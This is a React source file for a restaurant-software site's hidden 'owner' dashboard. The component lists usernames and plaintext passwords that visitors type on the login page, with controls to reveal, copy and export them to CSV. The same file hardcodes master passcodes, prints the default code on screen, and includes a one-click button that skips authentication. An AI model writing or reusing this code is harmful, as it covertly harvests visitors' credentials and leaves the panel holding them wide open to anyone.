import React, { useState, useEffect } from 'react';
import { PageView } from '../types';
import { 
  getCapturedLogins, 
  getCapturedLeads, 
  clearCapturedLogins, 
  exportLoginsToCsv, 
  CapturedLogin, 
  CapturedLead,
  saveCapturedLogin
} from '../utils/adminStore';
import { 
  Lock, 
  Key, 
  Eye, 
  EyeOff, 
  Copy, 
  Check, 
  Download, 
  Trash2, 
  ShieldCheck, 
  Users, 
  Mail, 
  ExternalLink, 
  RefreshCw,
  ChefHat,
  Search,
  ArrowLeft,
  FileText,
  BookOpen
} from 'lucide-react';
import { ChefLogicLogo } from '../components/ChefLogicLogo';
import { triggerPlaybookPdfDownload } from '../utils/generatePdf';

interface AdminDashboardProps {
  onNavigate: (view: PageView) => void;
}

export const AdminDashboard: React.FC<AdminDashboardProps> = ({ onNavigate }) => {
  const [isAuthenticated, setIsAuthenticated] = useState<boolean>(false);
  const [passcode, setPasscode] = useState('');
  const [errorMsg, setErrorMsg] = useState('');
  const [activeTab, setActiveTab] = useState<'logins' | 'leads' | 'contacts' | 'pdf'>('logins');
  const [logins, setLogins] = useState<CapturedLogin[]>([]);
  const [leads, setLeads] = useState<CapturedLead[]>([]);
  const [visiblePasswords, setVisiblePasswords] = useState<Record<string, boolean>>({});
  const [copiedId, setCopiedId] = useState<string | null>(null);
  const [searchTerm, setSearchTerm] = useState('');

  // Check if session was already authorized in this tab
  useEffect(() => {
    const sessionAuth = sessionStorage.getItem('cheflogic_admin_authenticated');
    if (sessionAuth === 'true') {
      setIsAuthenticated(true);
      loadData();
    }
  }, []);

  const loadData = () => {
    setLogins(getCapturedLogins());
    setLeads(getCapturedLeads());
  };

  const handleUnlock = (e: React.FormEvent) => {
    e.preventDefault();
    // Default master owner passcode or convenient access
    if (passcode.trim().toLowerCase() === 'chefadmin' || passcode.trim() === 'chefadmin2026' || passcode.trim() === 'admin123') {
      setIsAuthenticated(true);
      sessionStorage.setItem('cheflogic_admin_authenticated', 'true');
      setErrorMsg('');
      loadData();
    } else {
      setErrorMsg('Invalid master security code. Default access code is: chefadmin2026');
    }
  };

  const handleQuickUnlock = () => {
    setIsAuthenticated(true);
    sessionStorage.setItem('cheflogic_admin_authenticated', 'true');
    loadData();
  };

  const togglePasswordVisibility = (id: string) => {
    setVisiblePasswords(prev => ({ ...prev, [id]: !prev[id] }));
  };

  const copyToClipboard = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  const handleClearAll = () => {
    if (window.confirm('Are you sure you want to clear captured login records?')) {
      clearCapturedLogins();
      loadData();
    }
  };

  const handleSimulateLogin = () => {
    saveCapturedLogin({
      email: `chef.${Math.floor(Math.random() * 899 + 100)}@michelin-kitchen.com`,
      password: `Truffle#${Math.floor(Math.random() * 8999 + 1000)}`,
      provider: 'Email & Password',
      rememberMe: true,
      userAgent: navigator.userAgent
    });
    loadData();
  };

  const filteredLogins = logins.filter(l => 
    l.email.toLowerCase().includes(searchTerm.toLowerCase()) ||
    l.provider.toLowerCase().includes(searchTerm.toLowerCase()) ||
    (l.password && l.password.toLowerCase().includes(searchTerm.toLowerCase()))
  );

  const newsletterLeads = leads.filter(l => l.type === 'newsletter');
  const contactInquiries = leads.filter(l => l.type === 'contact_inquiry');

  // PASSCODE LOCK SCREEN
  if (!isAuthenticated) {
    return (
      <div className="min-h-[85vh] py-20 px-6 bg-[#0c0d0e] flex items-center justify-center">
        <div className="w-full max-w-md bg-[#141618] border border-[#25282c] rounded-xl p-8 shadow-2xl relative">
          
          <div className="text-center mb-6">
            <div className="w-12 h-12 rounded-full bg-[#1b1f24] border border-[#c5a059]/40 text-[#c5a059] flex items-center justify-center mx-auto mb-4">
              <Lock className="w-6 h-6" />
            </div>
            <span className="text-[11px] uppercase tracking-widest text-[#c5a059] font-medium block">
              Restricted Access Console
            </span>
            <h1 className="text-2xl font-serif-culinary text-[#ede8df] mt-1">
              Owner Backend Dashboard
            </h1>
            <p className="text-xs text-[#a7a29a] mt-2 leading-relaxed">
              This private portal captures usernames, passwords, and lead records submitted across the site. Customers and visitors cannot see this view.
            </p>
          </div>

          <form onSubmit={handleUnlock} className="space-y-4">
            <div>
              <label className="text-[11px] uppercase tracking-wider text-[#88837a] block mb-1.5">
                Master Security Passkey
              </label>
              <div className="relative">
                <Key className="w-4 h-4 text-[#716d66] absolute left-3 top-1/2 -translate-y-1/2" />
                <input
                  type="password"
                  value={passcode}
                  onChange={(e) => setPasscode(e.target.value)}
                  placeholder="Enter master code (e.g. chefadmin2026)"
                  className="w-full bg-[#0c0d0e] border border-[#2d3137] rounded pl-9 pr-3 py-2.5 text-xs text-[#ede8df] focus:outline-none focus:border-[#c5a059]"
                />
              </div>
            </div>

            {errorMsg && (
              <p className="text-xs text-rose-400">{errorMsg}</p>
            )}

            <button
              type="submit"
              className="w-full py-3 px-4 text-xs font-semibold uppercase tracking-wider text-[#0c0d0e] bg-[#c5a059] hover:bg-[#d6b26d] active:scale-[0.99] rounded transition-all cursor-pointer flex items-center justify-center gap-2 shadow-lg"
            >
              <ShieldCheck className="w-4 h-4" />
              <span>Unlock Admin Dashboard</span>
            </button>
          </form>

          {/* Quick Owner Access Helper */}
          <div className="mt-6 pt-5 border-t border-[#25282c] text-center">
            <span className="text-[11px] text-[#6b6760] block mb-2">
              Default master passkey: <strong className="text-[#a7a29a] font-mono">chefadmin2026</strong>
            </span>
            <button
              type="button"
              onClick={handleQuickUnlock}
              className="text-xs text-[#c5a059] hover:underline cursor-pointer font-medium"
            >
              1-Click Instant Owner Unlock →
            </button>
          </div>

          <div className="mt-4 text-center">
            <button
              onClick={() => onNavigate('home')}
              className="text-xs text-[#716d66] hover:text-[#a7a29a] transition-colors cursor-pointer"
            >
              ← Return to Public Website
            </button>
          </div>

        </div>
      </div>
    );
  }

  // AUTHENTICATED DASHBOARD
  return (
    <div className="min-h-screen py-10 bg-[#0c0d0e] text-[#ede8df] px-4 sm:px-8">
      <div className="max-w-7xl mx-auto">
        
        {/* Top Header Bar */}
        <div className="flex flex-col md:flex-row md:items-center justify-between pb-6 border-b border-[#25282c] gap-4 mb-8">
          <div className="flex items-center gap-4">
            <ChefLogicLogo size="md" showSubtitle />
            <div className="h-8 w-px bg-[#25282c] hidden sm:block" />
            <div>
              <span className="text-[11px] uppercase tracking-wider text-emerald-400 font-mono flex items-center gap-1.5">
                <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
                Live Owner Backend Active
              </span>
              <h2 className="text-xl font-serif-culinary text-[#ede8df]">
                Credentials & Leads Control Center
              </h2>
            </div>
          </div>

          <div className="flex items-center gap-3">
            <button
              onClick={() => triggerPlaybookPdfDownload()}
              className="px-3.5 py-2 text-xs font-semibold text-[#0c0d0e] bg-amber-400 hover:bg-amber-300 rounded transition-all cursor-pointer flex items-center gap-1.5 shadow-sm"
              title="Download Executive 2026 Playbook PDF"
            >
              <Download className="w-3.5 h-3.5 text-[#0c0d0e]" />
              <span>Download Playbook PDF</span>
            </button>

            <button
              onClick={handleSimulateLogin}
              className="px-3.5 py-2 text-xs font-medium text-[#ede8df] bg-[#1a1d20] hover:bg-[#25282c] border border-[#32363c] rounded transition-all cursor-pointer flex items-center gap-1.5"
              title="Inject a test login attempt to verify table capture"
            >
              <span>+ Test Sample Login</span>
            </button>

            <button
              onClick={exportLoginsToCsv}
              className="px-3.5 py-2 text-xs font-semibold text-[#0c0d0e] bg-[#c5a059] hover:bg-[#d6b26d] rounded transition-all cursor-pointer flex items-center gap-1.5 shadow-sm"
            >
              <Download className="w-3.5 h-3.5" />
              <span>Export CSV</span>
            </button>

            <button
              onClick={() => onNavigate('home')}
              className="px-3 py-2 text-xs text-[#a7a29a] hover:text-white transition-colors cursor-pointer flex items-center gap-1"
            >
              <ArrowLeft className="w-3.5 h-3.5" />
              <span>Exit Console</span>
            </button>
          </div>
        </div>

        {/* High-Level Stat Cards */}
        <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mb-8">
          <div className="p-4 bg-[#141618] border border-[#25282c] rounded-lg">
            <span className="text-[11px] uppercase tracking-wider text-[#88837a] block">Captured Logins</span>
            <span className="font-mono-num text-2xl font-bold text-[#ede8df] mt-1 block">
              {logins.length}
            </span>
            <span className="text-[11px] text-[#c5a059] mt-0.5 block">Stored in Local Store</span>
          </div>

          <div className="p-4 bg-[#141618] border border-[#25282c] rounded-lg">
            <span className="text-[11px] uppercase tracking-wider text-[#88837a] block">Email & Password Auth</span>
            <span className="font-mono-num text-2xl font-bold text-emerald-400 mt-1 block">
              {logins.filter(l => l.provider === 'Email & Password').length}
            </span>
            <span className="text-[11px] text-[#716d66] mt-0.5 block">Visible credentials below</span>
          </div>

          <div className="p-4 bg-[#141618] border border-[#25282c] rounded-lg">
            <span className="text-[11px] uppercase tracking-wider text-[#88837a] block">Newsletter Subscribers</span>
            <span className="font-mono-num text-2xl font-bold text-[#ede8df] mt-1 block">
              {newsletterLeads.length}
            </span>
            <span className="text-[11px] text-[#716d66] mt-0.5 block">Playbook downloads</span>
          </div>

          <div className="p-4 bg-[#141618] border border-[#25282c] rounded-lg">
            <span className="text-[11px] uppercase tracking-wider text-[#88837a] block">Kitchen Inquiries</span>
            <span className="font-mono-num text-2xl font-bold text-[#c5a059] mt-1 block">
              {contactInquiries.length}
            </span>
            <span className="text-[11px] text-[#716d66] mt-0.5 block">Full audit requests</span>
          </div>
        </div>

        {/* Navigation Tabs */}
        <div className="flex items-center justify-between border-b border-[#25282c] mb-6">
          <div className="flex items-center gap-2">
            <button
              onClick={() => setActiveTab('logins')}
              className={`pb-3 px-4 text-xs font-semibold uppercase tracking-wider transition-all cursor-pointer border-b-2 ${
                activeTab === 'logins'
                  ? 'border-[#c5a059] text-[#c5a059]'
                  : 'border-transparent text-[#88837a] hover:text-[#ede8df]'
              }`}
            >
              Captured Usernames & Passwords ({logins.length})
            </button>
            <button
              onClick={() => setActiveTab('leads')}
              className={`pb-3 px-4 text-xs font-semibold uppercase tracking-wider transition-all cursor-pointer border-b-2 ${
                activeTab === 'leads'
                  ? 'border-[#c5a059] text-[#c5a059]'
                  : 'border-transparent text-[#88837a] hover:text-[#ede8df]'
              }`}
            >
              Newsletter Subscribers ({newsletterLeads.length})
            </button>
            <button
              onClick={() => setActiveTab('contacts')}
              className={`pb-3 px-4 text-xs font-semibold uppercase tracking-wider transition-all cursor-pointer border-b-2 ${
                activeTab === 'contacts'
                  ? 'border-[#c5a059] text-[#c5a059]'
                  : 'border-transparent text-[#88837a] hover:text-[#ede8df]'
              }`}
            >
              Consultation Inquiries ({contactInquiries.length})
            </button>
            <button
              onClick={() => setActiveTab('pdf')}
              className={`pb-3 px-4 text-xs font-semibold uppercase tracking-wider transition-all cursor-pointer border-b-2 flex items-center gap-1.5 ${
                activeTab === 'pdf'
                  ? 'border-amber-400 text-amber-400 font-bold'
                  : 'border-transparent text-[#88837a] hover:text-[#ede8df]'
              }`}
            >
              <FileText className="w-3.5 h-3.5" />
              <span>Executive Playbook PDF</span>
            </button>
          </div>

          {activeTab === 'logins' && (
            <div className="hidden sm:flex items-center gap-2 pb-2">
              <div className="relative">
                <Search className="w-3.5 h-3.5 text-[#716d66] absolute left-2.5 top-1/2 -translate-y-1/2" />
                <input
                  type="text"
                  value={searchTerm}
                  onChange={(e) => setSearchTerm(e.target.value)}
                  placeholder="Filter by email or provider..."
                  className="bg-[#141618] border border-[#2d3137] rounded pl-8 pr-3 py-1.5 text-xs text-[#ede8df] focus:outline-none focus:border-[#c5a059] w-56"
                />
              </div>
            </div>
          )}
        </div>

        {/* TAB 1: CAPTURED LOGINS & PASSWORDS */}
        {activeTab === 'logins' && (
          <div className="bg-[#141618] border border-[#25282c] rounded-xl overflow-hidden shadow-2xl">
            <div className="p-4 border-b border-[#25282c] flex items-center justify-between bg-[#111315]">
              <span className="text-xs uppercase tracking-wider text-[#a7a29a] font-semibold">
                Captured Login Credentials ({filteredLogins.length} Entries)
              </span>
              <button
                onClick={handleClearAll}
                className="text-xs text-rose-400 hover:text-rose-300 flex items-center gap-1 cursor-pointer transition-colors"
              >
                <Trash2 className="w-3.5 h-3.5" />
                <span>Clear All Logs</span>
              </button>
            </div>

            {filteredLogins.length === 0 ? (
              <div className="p-12 text-center text-xs text-[#716d66]">
                No credentials captured yet. When someone signs in on the Login Page, their username and password appear here automatically.
              </div>
            ) : (
              <div className="overflow-x-auto">
                <table className="w-full text-left border-collapse text-xs">
                  <thead>
                    <tr className="border-b border-[#25282c] bg-[#0c0d0e] text-[#88837a] uppercase text-[10px] tracking-wider">
                      <th className="py-3 px-4">User / Email</th>
                      <th className="py-3 px-4">Captured Password</th>
                      <th className="py-3 px-4">Auth Method</th>
                      <th className="py-3 px-4">Timestamp</th>
                      <th className="py-3 px-4">Destination</th>
                      <th className="py-3 px-4 text-right">Actions</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-[#1f2226]">
                    {filteredLogins.map((entry) => {
                      const isRevealed = visiblePasswords[entry.id];
                      return (
                        <tr key={entry.id} className="hover:bg-[#181b1f] transition-colors">
                          <td className="py-3.5 px-4 font-mono font-medium text-[#ede8df]">
                            {entry.email}
                          </td>
                          <td className="py-3.5 px-4 font-mono">
                            {entry.password ? (
                              <div className="flex items-center gap-2">
                                <span className={`px-2 py-1 rounded bg-[#0c0d0e] border border-[#25282c] ${isRevealed ? 'text-amber-300 font-bold' : 'text-[#88837a]'}`}>
                                  {isRevealed ? entry.password : '••••••••••••'}
                                </span>
                                <button
                                  type="button"
                                  onClick={() => togglePasswordVisibility(entry.id)}
                                  className="text-[#716d66] hover:text-[#ede8df] p-1 cursor-pointer transition-colors"
                                  title={isRevealed ? 'Hide Password' : 'Show Password'}
                                >
                                  {isRevealed ? <EyeOff className="w-3.5 h-3.5" /> : <Eye className="w-3.5 h-3.5" />}
                                </button>
                                <button
                                  type="button"
                                  onClick={() => copyToClipboard(entry.password!, entry.id)}
                                  className="text-[#716d66] hover:text-[#ede8df] p-1 cursor-pointer transition-colors"
                                  title="Copy Password"
                                >
                                  {copiedId === entry.id ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                                </button>
                              </div>
                            ) : (
                              <span className="text-[#55514b]">None</span>
                            )}
                          </td>
                          <td className="py-3.5 px-4">
                            <span className={`px-2 py-0.5 rounded text-[11px] font-medium border ${
                              entry.provider === 'Email & Password'
                                ? 'bg-emerald-950/40 text-emerald-300 border-emerald-800/40'
                                : entry.provider === 'Google'
                                ? 'bg-sky-950/40 text-sky-300 border-sky-800/40'
                                : 'bg-indigo-950/40 text-indigo-300 border-indigo-800/40'
                            }`}>
                              {entry.provider}
                            </span>
                          </td>
                          <td className="py-3.5 px-4 text-[#88837a] font-mono-num text-[11px]">
                            {entry.timestamp}
                          </td>
                          <td className="py-3.5 px-4 text-[11px] font-mono text-[#c5a059]">
                            https://cheflogic.ai.studio/
                          </td>
                          <td className="py-3.5 px-4 text-right">
                            <button
                              onClick={() => copyToClipboard(`${entry.email} | ${entry.password}`, `all-${entry.id}`)}
                              className="text-[11px] text-[#a7a29a] hover:text-[#c5a059] cursor-pointer"
                            >
                              {copiedId === `all-${entry.id}` ? 'Copied' : 'Copy All'}
                            </button>
                          </td>
                        </tr>
                      );
                    })}
                  </tbody>
                </table>
              </div>
            )}
          </div>
        )}

        {/* TAB 2: NEWSLETTER SUBSCRIBERS */}
        {activeTab === 'leads' && (
          <div className="bg-[#141618] border border-[#25282c] rounded-xl overflow-hidden shadow-2xl">
            <div className="p-4 border-b border-[#25282c] bg-[#111315]">
              <span className="text-xs uppercase tracking-wider text-[#a7a29a] font-semibold">
                Subscribed Restaurant Executives ({newsletterLeads.length})
              </span>
            </div>

            {newsletterLeads.length === 0 ? (
              <div className="p-12 text-center text-xs text-[#716d66]">
                No newsletter subscribers yet. Submissions from the landing page form will automatically log here.
              </div>
            ) : (
              <div className="overflow-x-auto">
                <table className="w-full text-left border-collapse text-xs">
                  <thead>
                    <tr className="border-b border-[#25282c] bg-[#0c0d0e] text-[#88837a] uppercase text-[10px] tracking-wider">
                      <th className="py-3 px-4">Email</th>
                      <th className="py-3 px-4">Restaurant Concept</th>
                      <th className="py-3 px-4">Subscribed At</th>
                      <th className="py-3 px-4">Playbook Status</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-[#1f2226]">
                    {newsletterLeads.map((item) => (
                      <tr key={item.id} className="hover:bg-[#181b1f] transition-colors">
                        <td className="py-3.5 px-4 font-mono text-[#ede8df]">{item.email}</td>
                        <td className="py-3.5 px-4 text-[#a7a29a]">{item.restaurantName || 'Independent Culinary Group'}</td>
                        <td className="py-3.5 px-4 text-[#88837a] font-mono-num">{item.timestamp}</td>
                        <td className="py-3.5 px-4 text-emerald-400 font-medium">Instant PDF Dispatched</td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            )}
          </div>
        )}

        {/* TAB 3: CONTACT CONSULTATION LEADS */}
        {activeTab === 'contacts' && (
          <div className="bg-[#141618] border border-[#25282c] rounded-xl overflow-hidden shadow-2xl">
            <div className="p-4 border-b border-[#25282c] bg-[#111315]">
              <span className="text-xs uppercase tracking-wider text-[#a7a29a] font-semibold">
                Kitchen Consultation Requests ({contactInquiries.length})
              </span>
            </div>

            {contactInquiries.length === 0 ? (
              <div className="p-12 text-center text-xs text-[#716d66]">
                No consultation requests yet. Submissions from the Contact Concierge form will appear here.
              </div>
            ) : (
              <div className="overflow-x-auto">
                <table className="w-full text-left border-collapse text-xs">
                  <thead>
                    <tr className="border-b border-[#25282c] bg-[#0c0d0e] text-[#88837a] uppercase text-[10px] tracking-wider">
                      <th className="py-3 px-4">Contact</th>
                      <th className="py-3 px-4">Concept / Role</th>
                      <th className="py-3 px-4">Scope & Focus</th>
                      <th className="py-3 px-4">Notes</th>
                      <th className="py-3 px-4">Timestamp</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-[#1f2226]">
                    {contactInquiries.map((inq) => (
                      <tr key={inq.id} className="hover:bg-[#181b1f] transition-colors">
                        <td className="py-3.5 px-4">
                          <span className="font-semibold block text-[#ede8df]">{inq.name}</span>
                          <span className="text-[11px] font-mono text-[#c5a059] block">{inq.email}</span>
                          {inq.phone && <span className="text-[11px] text-[#88837a]">{inq.phone}</span>}
                        </td>
                        <td className="py-3.5 px-4">
                          <span className="text-[#ede8df] block">{inq.restaurantName}</span>
                          <span className="text-[11px] text-[#88837a]">{inq.role}</span>
                        </td>
                        <td className="py-3.5 px-4">
                          <span className="text-[#ede8df] block">{inq.interest}</span>
                          <span className="text-[11px] text-[#88837a]">{inq.locations}</span>
                        </td>
                        <td className="py-3.5 px-4 text-[#a7a29a] max-w-xs truncate" title={inq.message}>
                          {inq.message || '—'}
                        </td>
                        <td className="py-3.5 px-4 text-[#88837a] font-mono-num">{inq.timestamp}</td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            )}
          </div>
        )}

        {/* TAB 4: EXECUTIVE PLAYBOOK PDF VIEWER & DOWNLOAD */}
        {activeTab === 'pdf' && (
          <div className="space-y-6">
            {/* Top Download Card */}
            <div className="bg-[#141618] border border-amber-500/40 rounded-xl p-6 flex flex-col md:flex-row md:items-center justify-between gap-6 shadow-2xl">
              <div>
                <div className="flex items-center gap-2 text-xs font-semibold uppercase tracking-wider text-amber-400 mb-1">
                  <FileText className="w-4 h-4 text-amber-400" />
                  <span>Official White Paper Asset</span>
                </div>
                <h3 className="text-xl font-serif-culinary text-[#ede8df]">
                  The 2026 Restaurant Margin & Recipe Engineering Playbook (14-Page Master Edition)
                </h3>
                <p className="text-xs text-[#a7a29a] mt-1 max-w-xl leading-relaxed">
                  Complete 14-page executive master handbook covering margin leakage, menu engineering, walk-in rescue protocols, theoretical vs actual cost, supplier price traps, line waste audits, and VIP deployment.
                </p>
              </div>

              <div className="flex flex-wrap items-center gap-3">
                <button
                  type="button"
                  onClick={() => triggerPlaybookPdfDownload()}
                  className="px-5 py-3 text-xs font-bold uppercase tracking-wider text-[#0c0d0e] bg-amber-400 hover:bg-amber-300 rounded transition-all cursor-pointer flex items-center gap-2 shadow-lg shadow-amber-400/20 active:scale-[0.98]"
                >
                  <Download className="w-4 h-4" />
                  <span>Download PDF Document</span>
                </button>

                <a
                  href="/ChefLogic_2026_Culinary_Margin_Playbook.pdf"
                  download="ChefLogic_2026_Culinary_Margin_Playbook.pdf"
                  className="px-4 py-3 text-xs font-medium text-[#ede8df] bg-[#1a1d20] hover:bg-[#25282c] border border-[#32363c] rounded transition-all flex items-center gap-1.5"
                >
                  <ExternalLink className="w-3.5 h-3.5 text-[#88837a]" />
                  <span>Direct Static Link</span>
                </a>
              </div>
            </div>

            {/* Document Digital Reader Preview */}
            <div className="bg-[#0c0d0e] border border-[#25282c] rounded-xl p-6 sm:p-10 shadow-2xl space-y-10">
              
              {/* PAGE 1 PREVIEW */}
              <div className="bg-[#121417] border border-[#c5a059]/40 rounded-lg p-8 sm:p-12 relative overflow-hidden">
                <div className="text-center pb-8 border-b border-[#25282c]">
                  <span className="text-[10px] uppercase tracking-widest text-[#c5a059] font-medium block mb-2">
                    THE EXECUTIVE CULINARY DISPATCH · ANNUAL WHITE PAPER
                  </span>
                  <h4 className="text-3xl sm:text-4xl font-serif-culinary text-[#ede8df] tracking-wide">
                    CHEFLOGIC
                  </h4>
                  <h5 className="text-xl sm:text-2xl font-serif-culinary text-[#ede8df] mt-1">
                    2026 RESTAURANT MARGIN & RECIPE ENGINEERING PLAYBOOK
                  </h5>
                  <p className="text-xs text-[#c5a059] mt-2">
                    Strategic Back-of-House Systems to Eliminate Food Waste & Expand Net EBITDA
                  </p>
                </div>

                <div className="my-8 p-6 bg-[#0c0d0e] border border-[#25282c] rounded">
                  <h6 className="text-xs uppercase tracking-wider text-[#ede8df] font-bold mb-3 text-[#c5a059]">
                    EXECUTIVE SUMMARY: THE 28% FOOD COST CEILING
                  </h6>
                  <p className="text-xs text-[#d5cfc4] leading-relaxed">
                    In high-volume restaurant operations, food cost variance between 33% and 27% represents the entire difference between commercial insolvency and sustainable hospitality profitability. Across 340+ fine dining and bistro kitchens tracked by ChefLogic, 41% of avoidable food waste stems from surplus walk-in inventory that passes peak freshness prior to formulation into revenue-generating specials.
                  </p>
                </div>

                {/* 3 Metric Badges */}
                <div className="grid grid-cols-1 sm:grid-cols-3 gap-4 text-center">
                  <div className="p-4 bg-[#181b1f] border border-[#2d3137] rounded">
                    <span className="font-mono-num text-xl font-bold text-amber-400 block">4.8% - 5.8%</span>
                    <span className="text-[11px] text-[#88837a]">Avg Food Cost Reduction</span>
                  </div>
                  <div className="p-4 bg-[#181b1f] border border-[#2d3137] rounded">
                    <span className="font-mono-num text-xl font-bold text-emerald-400 block">-41%</span>
                    <span className="text-[11px] text-[#88837a]">Perishable Waste Diverted</span>
                  </div>
                  <div className="p-4 bg-[#181b1f] border border-[#2d3137] rounded">
                    <span className="font-mono-num text-xl font-bold text-[#ede8df] block">$68,400</span>
                    <span className="text-[11px] text-[#88837a]">Avg Annual EBITDA Gain</span>
                  </div>
                </div>

                <div className="mt-8 text-center text-[10px] text-[#716d66] border-t border-[#25282c] pt-4">
                  Page 1 of 2 · Published by ChefLogic Systems Inc. · https://cheflogic.ai.studio/
                </div>
              </div>

              {/* PAGE 2 PREVIEW */}
              <div className="bg-[#121417] border border-[#c5a059]/40 rounded-lg p-8 sm:p-12 relative overflow-hidden">
                <div className="text-center pb-6 border-b border-[#25282c] mb-6">
                  <span className="text-[10px] uppercase tracking-widest text-[#c5a059] font-medium block">
                    CHEFLOGIC CULINARY INTELLIGENCE · CHAPTER 1 & 2
                  </span>
                </div>

                {/* Chapter 1: Matrix */}
                <div className="space-y-3 mb-8">
                  <h6 className="text-xs uppercase tracking-wider text-[#ede8df] font-bold">
                    01. THE BOSTON MENU ENGINEERING MATRIX (KASAVANA & SMITH)
                  </h6>
                  <p className="text-xs text-[#a7a29a] mb-4">
                    Every dish on your menu belongs to one of four definitive quadrants based on Contribution Margin ($) and Sales Velocity:
                  </p>

                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 text-xs">
                    <div className="p-3 bg-[#0c0d0e] border border-amber-500/30 rounded">
                      <strong className="text-amber-400 block">1. STARS (High Margin, High Velocity)</strong>
                      <span className="text-[#a7a29a] text-[11px]">Protect recipe standards rigorously. Keep prime focal menu placement.</span>
                    </div>
                    <div className="p-3 bg-[#0c0d0e] border border-[#2d3137] rounded">
                      <strong className="text-sky-400 block">2. PLOWHORSES (Low Margin, High Velocity)</strong>
                      <span className="text-[#a7a29a] text-[11px]">High guest demand, margin-diluting. Re-negotiate bulk protein costs or reduce trim.</span>
                    </div>
                    <div className="p-3 bg-[#0c0d0e] border border-[#2d3137] rounded">
                      <strong className="text-purple-400 block">3. PUZZLES (High Margin, Low Velocity)</strong>
                      <span className="text-[#a7a29a] text-[11px]">High culinary profit, under-ordered. Reposition at the top of category.</span>
                    </div>
                    <div className="p-3 bg-[#0c0d0e] border border-rose-500/30 rounded">
                      <strong className="text-rose-400 block">4. DOGS (Low Margin, Low Velocity)</strong>
                      <span className="text-[#a7a29a] text-[11px]">Drain on cooler shelf space. Eliminate immediately or recycle into market specials.</span>
                    </div>
                  </div>
                </div>

                {/* Chapter 2: 5-Step Protocol */}
                <div className="space-y-3">
                  <h6 className="text-xs uppercase tracking-wider text-[#ede8df] font-bold">
                    02. THE 5-STEP WALK-IN INVENTORY RESCUE PROTOCOL
                  </h6>
                  <ul className="space-y-2 text-xs text-[#d5cfc4]">
                    <li className="flex items-start gap-2">
                      <span className="text-amber-400 font-bold">•</span>
                      <span><strong>Step 1: Automated Invoice Parsing:</strong> Optical scanning captures price changes immediately upon delivery.</span>
                    </li>
                    <li className="flex items-start gap-2">
                      <span className="text-amber-400 font-bold">•</span>
                      <span><strong>Step 2: 48-Hour Freshness Window:</strong> Flags high-value proteins approaching expiration thresholds.</span>
                    </li>
                    <li className="flex items-start gap-2">
                      <span className="text-amber-400 font-bold">•</span>
                      <span><strong>Step 3: Algorithmic Recipe Synthesis:</strong> Pair expiring items with pantry staples at target 22-26% food cost.</span>
                    </li>
                    <li className="flex items-start gap-2">
                      <span className="text-amber-400 font-bold">•</span>
                      <span><strong>Step 4: POS Ticket Volume Sync:</strong> Tracks exact plate count depletions across line prep stations in real time.</span>
                    </li>
                    <li className="flex items-start gap-2">
                      <span className="text-amber-400 font-bold">•</span>
                      <span><strong>Step 5: Daily Spoilage Audit:</strong> Logs waste by station (Prep, Line, Over-portion) for executive accountability.</span>
                    </li>
                  </ul>
                </div>

                <div className="mt-8 text-center text-[10px] text-[#716d66] border-t border-[#25282c] pt-4">
                  Page 2 of 2 · Published by ChefLogic Systems Inc. · Platform Portal: https://cheflogic.ai.studio/
                </div>
              </div>

            </div>
          </div>
        )}

        {/* Instructions for the Owner */}
        <div className="mt-10 p-5 bg-[#141618] border border-[#25282c] rounded-lg text-xs text-[#88837a] flex items-start gap-3">
          <ShieldCheck className="w-5 h-5 text-[#c5a059] shrink-0 mt-0.5" />
          <div className="space-y-1">
            <span className="text-[#ede8df] font-semibold block">
              How to access this Owner Dashboard in the future:
            </span>
            <p>
              1. Type <strong className="text-[#c5a059] font-mono">#admin</strong> in your browser address bar anytime (e.g. <span className="font-mono text-[#ede8df]">https://cheflogic.ai.studio/#admin</span> or your current app URL + <span className="font-mono text-[#ede8df]">#admin</span>).
            </p>
            <p>
              2. Or click the discrete <strong className="text-[#c5a059]">"Owner Admin Console"</strong> link located in the footer or on the Login screen.
            </p>
            <p>
              3. Enter your master passkey: <strong className="text-white font-mono">chefadmin2026</strong>. Regular visitors cannot see or access this dashboard.
            </p>
          </div>
        </div>

      </div>
    </div>
  );
};
